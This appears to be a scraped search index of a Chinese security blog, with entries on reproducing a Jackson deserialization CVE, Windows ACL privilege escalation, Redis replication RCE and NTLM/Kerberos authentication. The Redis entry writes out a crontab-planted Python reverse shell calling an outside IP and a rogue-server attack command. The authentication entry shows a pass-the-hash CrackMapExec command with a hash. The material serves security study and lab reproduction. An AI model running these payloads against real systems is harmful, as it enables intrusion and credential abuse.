","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:0","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-12384：Jackson反序列化漏洞复现","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"RCE payload测试 将java文件中的payload更换为RCE，编译并运行java程序 ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:1","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-12384：Jackson反序列化漏洞复现","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"SSRF payload测试 执行nc -l -vv 4444，便于观察SSRF的结果 将java文件中的payload更换为SSRF，编译并运行java程序 ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:2","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-12384：Jackson反序列化漏洞复现","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"参考 https://blog.doyensec.com/2019/07/22/jackson-gadgets.html https://www.anquanke.com/post/id/182695 ","date":"2019-07-26","objectID":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:4:0","tags":["Jackson-databind","漏洞复现"],"title":"CVE-2019-12384：Jackson反序列化漏洞复现","uri":"/2019/07/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"组策略与 ACL 原理及实验","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/","tags":["域安全","内网渗透"],"title":"组策略与ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["内网渗透"],"content":"组策略的部署及下发原理 本地组策略和域内组策略 域服务器如何存储组策略 组策略的下发和获取 客户端如何存储组策略 ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:0:0","tags":["域安全","内网渗透"],"title":"组策略与ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["内网渗透"],"content":"Server Manager 的组策略管理工具 更专业的组策略管理工具GPMC，可以管理多个域 创建并编辑组策略的内容 组策略分作主机策略和用户策略，machine和users目录； 脚本类型和非脚本类型, script目录 管理组策略的应用范围(演示) ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:1:0","tags":["域安全","内网渗透"],"title":"组策略与ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["内网渗透"],"content":"组策略的存储 存储在服务器中，\\domain\\sysvol\\policies，以明文方式存储为xml、ini、inf等文件 对域内所有用户开放读权限 ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:2:0","tags":["域安全","内网渗透"],"title":"组策略与ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["内网渗透"],"content":"组策略的更新 客户端每90分钟主动获取一次组策略，检查组策略是否发生变更 客户端使用gpupdate /force强制立即检查组策略 参数可以分为主机和用户，gpupdate /force /target:computer ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:3:0","tags":["域安全","内网渗透"],"title":"组策略与ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["内网渗透"],"content":"组策略的下发和获取 组策略的查询原理： LDAP检索所有的组策略，那些属于自己的 查询组策略，服务器决定需要返回哪些策略（版本号是决定的重要因素） ACL 访问控制链 ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:4:0","tags":["域安全","内网渗透"],"title":"组策略与ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["内网渗透"],"content":"Access Control Link Windows安全对象的ACL 所有的Windows对象都称为安全对象，文件、进程、注册表、内存等 为每个安全对象赋予一个安全描述符(Security descriptor) Security identifiers (SIDs)for the owner and primary group of an object A DACL that specifies the access rights allowed or denied to particular users or groups a SACL that specifies the types of access attempts that generate audit records for the object ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:5:0","tags":["域安全","内网渗透"],"title":"组策略与ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["内网渗透"],"content":"DACL DACL由多个ACE(Access Control Entry)组成 ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:6:0","tags":["域安全","内网渗透"],"title":"组策略与ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["内网渗透"],"content":"Windows 的访问控制 Windows的访问控制包括三部分:访问令牌、对象安全描述符和访问检查 访问令牌作为一个容器，通过Token体现 对象安全描述符表示目标对象的安全属性，通过安全矩阵详细描述该对象赋予不同用户组的权限 访问检查表示通过比较访问令牌和ACL，以决定该进程是否具有访问时申请的相应权限 Windows中高权限服务、进程所拥有的文件、目录如果存在着ACL设置不当，对低权限用户开放了“写”甚至“执行”权限，低权限用户可以通过修改、替换文件内容来达到执行指定代码的目的。例如Windows的System332目录如果开放了写权限,则可以向目录写入一个DLL,等待系统重新启动是,由 Svchost等程序加载即可实现权限提升(演示) ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:7:0","tags":["域安全","内网渗透"],"title":"组策略与ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["内网渗透"],"content":"ACL 安全审计 Sysinternalsuit提供的accesschk.exe可以对指定的目录、文件进行ACL检查，命令为accesschk.exe -w -s directory 其中directory为需要检测的目录 accesschk.exe,可以审计进程对所有用户组开放的权限。采用规则accesschk.exe -ppid可以获取某个进程开放的权限，其中pid可以用‘*’代，表示检测所有进程对不同用户组开放的权限。为了保证正常运行,运行Taccesschk.exe时需要较高的权限 ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:8:0","tags":["域安全","内网渗透"],"title":"组策略与ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["内网渗透"],"content":"利用 进程ACL漏洞的利用方法 ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:9:0","tags":["域安全","内网渗透"],"title":"组策略与ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["内网渗透"],"content":"第一种 通过OpenProcess获取进程句柄，并将目标代码写入该进程空间中，以该进程的权限运行这些代码，运行代码权限为该进程权限； ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:9:1","tags":["域安全","内网渗透"],"title":"组策略与ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["内网渗透"],"content":"第二种 通过OpenProcess获取进程句柄，再通过OpenProcessToken获取该进程的Token，并利用该Tokeni通过CreateProcessAsUser新的进程，新的进程权限和目标进程权限一致。 ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:9:2","tags":["域安全","内网渗透"],"title":"组策略与ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["内网渗透"],"content":"注册表的 ACL 注册表中的启动项、服务加载项如果对低权限用户开发了写权限，低权限用户可以向这些表项写入指定的文件，等待系统重新启动后实现权限提升 使用命令accesschk.exe -w -s -k HKLM，表示递归的扫描HKLM中开放了写权限的表项 ","date":"2019-07-24","objectID":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/:10:0","tags":["域安全","内网渗透"],"title":"组策略与ACL","uri":"/2019/07/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8Eacl/"},{"categories":["漏洞复现"],"content":"Redis 基于主从复制的 RCE 利用方式","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/","tags":["Redis","漏洞复现"],"title":"Redis 基于主从复制的 RCE 利用方式","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["漏洞复现"],"content":"Redis 基于主从复制的 RCE 利用方式 在 2019 年 7 月 7 日结束的 WCTF2019 Final 上，LC/BC 的成员 Pavel Toporkov 在分享会上介绍了一种关于 redis 新版本的 RCE 利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大，下面就让我们从以前的 redis RCE 利用方式出发，一起聊聊关于 redis 的利用问题。 https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf ","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:0:0","tags":["Redis","漏洞复现"],"title":"Redis 基于主从复制的 RCE 利用方式","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["漏洞复现"],"content":"通过写入文件 GetShell 未授权的 redis 会导致 GetShell，利用方式如下： 127.0.0.1:6379\u003e config set dir /var/spool/cron/crontabs OK 127.0.0.1:6379\u003e config set dbfilename root OK 127.0.0.1:6379\u003e get 1 \"\\n* * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"IP\\\",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\\n\" 127.0.0.1:6379\u003e save OK 而这种方式是通过写文件来完成 GetShell 的，这种方式的主要问题在于，redis 保存的数据并不是简单的 json 或者是 csv，所以写入的文件都会有大量的无用数据，形似 [padding] * * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"115.28.78.16\\\",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);' [padding] 这种主要利用了 crontab、ssh key、webshell 这样的文件都有一定容错性，再加上 crontab 和 ssh 服务可以说是服务器的标准的服务，所以在以前，这种通过写入文件的 getshell 方式基本就可以说是很通杀了。 但随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker 就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除 redis 以外的任何服务存在，包括 ssh 和 crontab，再加上权限的严格控制，只靠写文件就很难再 getshell 了，在这种情况下，我们就需要其他的利用手段了。 ","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:1:0","tags":["Redis","漏洞复现"],"title":"Redis 基于主从复制的 RCE 利用方式","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["漏洞复现"],"content":"通过主从复制 GetShell ","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:2:0","tags":["Redis","漏洞复现"],"title":"Redis 基于主从复制的 RCE 利用方式","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["漏洞复现"],"content":"Redis 主从复制 Redis 是一个使用 ANSI C 编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个 Redis 的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis 就提供了主从模式，主从模式就是指使用一个 redis 实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。 利用两台 docker 来做测试： docker search redis5 docker pull damonevking/redis5.0 docker ps 通过 slaveof 可以设置主从状态: 首先在 slave 上设置： 然后在 master 上设置： 在 slave 上，可以发现数据已经同步： ","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:2:1","tags":["Redis","漏洞复现"],"title":"Redis 基于主从复制的 RCE 利用方式","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["漏洞复现"],"content":"Redis 模块 在了解了主从同步之后，我们还需要对 redis 的模块有所了解。 在 Reids 4.x 之后，Redis 新增了模块功能，通过外部拓展，可以实现在 redis 中实现一个新的 Redis 命令，通过写 c 语言并编译出 .so 文件。 编写恶意 so 文件的代码 https://github.com/RicterZ/RedisModules-ExecuteCommand git clone 后，进入目录，用make命令编译即可获得 .so 库文件。 ","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:2:2","tags":["Redis","漏洞复现"],"title":"Redis 基于主从复制的 RCE 利用方式","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["漏洞复现"],"content":"利用原理 在两个 Redis 实例设置主从模式的时候，Redis 的主机实例可以通过 FULLRESYNC 同步文件到从机上。然后在从机上加载 so 文件，我们就可以执行拓展的新命令了。 ","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:3:0","tags":["Redis","漏洞复现"],"title":"Redis 基于主从复制的 RCE 利用方式","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["漏洞复现"],"content":"漏洞复现 使用模拟的恶意服务端来作为主机，并模拟 fullresync 请求。 https://github.com/LoRexxar/redis-rogue-server (注：作者利用的是 python3.7 环境成功执行) 然后启用 redis 5.0 的 docker 然后直接通过 POC 来攻击服务端 python3 redis-rogue-server.py --rhost 172.18.0.2 --rport 6379 --lhost 172.18.0.1 (注：在 docker 环境下反弹 shell 会出现问题，因此本文中的 lhost 使用的是 docker 宿主机的内网 IP。作者在使用外网 IP 的时候，会弹出错误) ","date":"2019-07-15","objectID":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/:4:0","tags":["Redis","漏洞复现"],"title":"Redis 基于主从复制的 RCE 利用方式","uri":"/2019/07/redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84rce%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"},{"categories":["内网渗透"],"content":"Windows认证相关","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Windows 认证 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:0:0","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Windows 本地认证 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:1:0","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"本地认证基础 在本地登录 Windows 的情况下，操作系统会使用用户输入的密码作为凭证去与系统中的密码进行验证，但是操作系统中的密码存储在哪里呢？ 路径：%SystemRoot%\\system32\\config\\sam 当我们登录系统的时候,系统会自动地读取 SAM 文件中的“密码”与我们输入的“密码”进行比对，如果相同，证明认证成功! 这个 SAM 文件中保留了计算机本地所有用户的凭证信息，可以理解为是一个数据库。 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:1:1","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"NTLM(NT LAN Manager) Hash NTLM Hash 是支持 Net NTLM 认证协议及本地认证过程中的一个重要参与物，其长度为 32 位，由数字与字母组成。 Windows 本身不存储用户的明文密码，它会将用户的明文密码经过加密算法后存储在 SAM 数据库中。 当用户登录时,将用户输入的明文密码也加密成 NTLM Hash,与 SAM 数据库中的 NTLM Hash 进行比较。NTLM Hash 的前身是 LM Hash，目前基本淘汰，但是还是存在。 NTLM Hash——产生 admin =\u003e 209c6174da490caeb422f3fa5a7ae634 admin -\u003e hex(16进制编码) = 61646d69e 61646d69e -\u003e unicode = 610064006d0069006e00 610064006d0069006e00 -\u003e MD4 = 209c6174da490caeb422f3fa5a7ae634 本地认证流程 Windows Logon Process(即 winlogon.exe 是 Windows NT 用户登陆程序，用于管理用户登录和退出。 LSASS 是微软 Windows 系统的安全机制。用于本地安全和登陆策略。 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:1:2","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"LM Hash 将所有小写字母转换为大写字母 123ABC //未达到7个字符 将密码转化为 16 进制，分两组，填充为 14 个字符，空余位使用 0x00 字符填补 31323341424300000000000000 将密码分割为两组 7 个字节的块 31323341424300 000000000000 //16 进制 将每组转化为比特流,不足 56Bit 则在左边加 0 31323341424300 -\u003e (转换为二进制) 11000100110010001100110100001010000100100001100000000-\u003e(补足 56Bit) 00110001001100100011001101000001010000100100001100000000 将比特流按照 7 比特一组，分出 8 组，末尾加 0 由于后者都为 0，结果可想而知，那就都是 0; 将每组比特流转换为 16 进制作为被加密的值，使用 DES 加密，字符串 KGS!@#$% 为Key(0x4B47532140232425)，得到 8 个结果，每个结果转换为 16 进制。 -\u003e 00110000100110001000110001101000000101000001001000001100 00000000 -\u003e30988C6814120C00 -\u003e DES(30988C6814120C00) -\u003e 48-D7-EB-91- 2F-5E-69-7C 由于我们的密码不超过 7 字节，所以后面的一半是固定的: AA-D3-B4-35-B5-14-04-EE 连接两个 DES 加密字符串。这是 LM 哈希。 48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:1:3","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Windows网络认证 在内网渗透中，经常遇到工作组环境，而工作组环境是一个逻辑上的网络环境(工作区)，隶属于工作组的机器之间无法互相建立一个完美的信任机制，只能点对点，是比较落后的认证方式，没有信托机构。 假设 A 主机与 B 主机属于同一个工作组环境，A 想访问 B 主机上的资料，需要将一个存在于 B 主机上的账户凭证发送至 B 主机，经过认证才能够访问 B 主机上的资源。 这是我们接触比较多的 SMB 共享文件的案例，SMB 的默认端口是 445。 早期 SMB 协议在网络上传输明文口令。后来出现 LAN Manager Challenge/Response 验证机制，简称 LM，它是如此简单以至很容易就被破解，现在又有了 NTLM v2 以及 Kerberos。 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:2:0","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Challenge/Response 第一步：协商 客户端主要在这一步向服务器确认协议的版本，是 v1 还是 v2。不止者一点点 第二步：质询完整过程： 客户端向服务器端发送用户信息(用户名)请求 服务器接受到请求，生成一个 16 位的随机数，被称之为“Challenge”， 使用登录用户名对应的 NTLM Hash 加密 Challenge (16 位随机字符)，生成 Challenge1。同时，生成 Challenge1 后，将 Challenge (16 位随机字符)发送给客户端。//Net NTLM Hash = NTLM Hash(Challenge) 客户端接受到 Challenge 后，使用将要登录到账户对应的 NTLM Hash 加密 Challenge 生成 Response，然后将 Response 发送至服务器端。 第三步：验证 服务器端收到客户端的 Response 后，比对 Chanllenge1 与 Response 是否相等，若相等，则认证通过。 使用另外一种方式解读： Server 接收到 Client 发送的用户名后，判断本地账户列表是否有用户名 share_user， 如果没有，返回认证失败； 如果有，生成 Chanllenge，并且从本地查找 share_user 对应的 NTLM Hash，使用 NTLM Hash 加密 Chanllenge，生成一个 Net-NTLM Hash 存在内存中，并将 Chanllenge 发送给 Client。 Client 接收到 Chanllenge 后，将自己提供的 share_user 的密码转换为 NTLM Hash，使用 NTLM Hash 加密 Chanllenge，这个结果叫 Response，表现形式是 Net-NTLM Hash，最后将 Response 发送给 Server。 Server 接收到 Client 发送的 Response，将 Response 与之前的 Net-NTLM Hash 进行比较，如果相等，则认证通过。 注意: Chanllenge 是 Server 产生的一个 16 字节的随机数，每次认证都不同 Response 的表现形式是 Net-NTLM Hash，它是由客户端提供的密码 Hash 加密 Server 返回的 Chanllenge 产生的结果。 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:2:1","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"NTLM v2 NTLM v1 与 NTLM v2 最显著的区别就是 Challenge 与加密算法不同，共同点就是加密的原料都是 NTLM Hash。 下面细说一下有什么不同: Challenge：NTLM v1 的 Challenge 有 8 位，NTLM v2 的 Challenge 为 16 位 Net-NTLM Hash：NTLM v1 的主要加密算法是 DES，NTLM v2 的主要加密算法是 HMAC-MD5。 //Responder、smbexec ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:2:2","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Pass The Hash 在内网渗透中，我们经常会需要抓取管理员的密码、NTLM Hash，通过搜集这些信息有助于我们扩大战果，尤其是在域环境下。 什么是哈希传递? 哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。 哈希传递的作用? 解决了我们渗透中获取不到明文密码、破解不了 NTLM Hash 而又想扩大战果的问题。 必要条件 哈希传递需要被认证的主机能够访问到服务器 哈希传递需要被传递认证的用户名 哈希传递需要被传递认证用户的 NTLM Hash 原理分析 要完成一个 NTLM 认证，第一步需要客户端将自己要参与认证的用户名发送至服务器端，等待服务器端给出的 Challenge 其实哈希传递就是使用用户名对应的 NTLM Hash 将服务器给出的 Chanllenge 加密，生成一个 Response，来完成认证。 Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程，所以不算是一个漏洞，算是一个技巧。 Pass The Hash的工具： Smbmap CrackMapExec Smbexec Metasploit 使用 CrackMapExec 实现 Hash 传递： root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami SMB 192.168.3.5 445 LIYINGZHEA30B [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True) SMB 192.168.3.5 445 LIYINGZHEA30B [+] PAYLOADS\\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)SMB 192.168.3.5 445 LIYINGZHEA30B [+] Executed command ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:2:3","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Kerberos域认证 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:0","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Active Directory(活动目录)的概念 Windows 提供了为企业管理资产、服务、网络对象进行组织化的管理，这非常符合企业架构的管理模式。而承载这些管理机制的就是活动目录服务。如果要搭建一个域，就需要安装活动目录服务。 活动目录服务以域名来划分域的边界，域外就不属于管理范围了，也就是说，一个域对应一个域名，域之间也可以相互信任。 Active Directory 存储了有关网络对象的信息，并且让管理员和用户能够轻松地查找和使用这些信息。Active Directory 使用了一种 结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。 网络对象分为:用户、用户组、计算机、域、组织单位以及安全策略等。 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:1","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"Active Directory(活动目录)的概念 服务器及客户端计算机管理:管理服务器及客户端计算机账户， 所有服务器及客户端计算机加入域管理并实施组策略。 用户服务:管理用户域账户、用户信息、企业通讯录(与电子邮件系统集成)、用户组管理、用户身份认证、用户授权管理等，按省实施组管理策略。 资源管理:管理打印机、文件共享服务等网络资源。 桌面配置:系统管理员可以集中的配置各种桌面配置策略，如: 用户使用域中资源权限限制、界面功能的限制、应用程序执行特征限制、网络连接限制、安全配置限制等。 应用系统支撑:支持财务、人事、电子邮件、企业信息门户、办公自动化、补丁管理、防病毒系统等各种应用系统。 在域中，网络对象可以相互访问，但是在真实情况中，需要对某些部门的计算机进行限制，例如：销售部门不能访问技术部门的服务器。 这个中间就需要 Kerberos 认证协议来验证网络对象间的权限。 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:2","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"域认证体系 - Kerberoes Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下，Kerberos作为一种可信任的第三方认证服务，是通过传统的密码技术(如:共享密钥)执行认证服务的。 ","date":"2019-07-07","objectID":"/2019/07/windows-%E8%AE%A4%E8%AF%81/:3:3","tags":["域安全","内网渗透","认证"],"title":"Windows 认证","uri":"/2019/07/windows-%E8%AE%A4%E8%AF%81/"},{"categories":["内网渗透"],"content":"域认证所参与的角色 Kerberos的标志是三只狗头，狗头分别代表以下角色： Client Server KDC(Key Distribution Center) = DC(Domain Controller) 